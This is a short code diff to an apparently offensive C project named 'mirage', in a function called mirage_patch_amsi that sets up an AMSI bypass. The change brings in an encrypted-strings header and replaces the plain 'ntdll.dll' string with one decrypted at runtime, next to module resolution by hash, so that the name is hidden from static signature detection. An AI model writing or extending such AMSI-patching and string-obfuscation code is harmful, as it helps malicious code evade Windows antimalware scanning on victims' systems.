@@ -19,6 +19,7 @@
 #include "hash.h"
 #include "nt_types.h"
 #include "mirage_asm.h"
+#include "enc_strings.h"
 #include <string.h>
 
 /* ── CONTEXT offsets for x64 ──────────────────────────────── */
@@ -148,8 +149,9 @@ int mirage_patch_amsi(void) {
     if (!scan_buffer) return 0;
 
     /* Resolve RtlAddVectoredExceptionHandler from ntdll */
+    char ntdll_name[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, ntdll_name);
     void* ntdll = mirage_get_module_by_hash(
-        mirage_encrypted_hash_module("ntdll.dll"));
+        mirage_encrypted_hash_module(ntdll_name));
     if (!ntdll) return 0;
 
     pRtlAddVectoredExceptionHandler fnAddVEH =
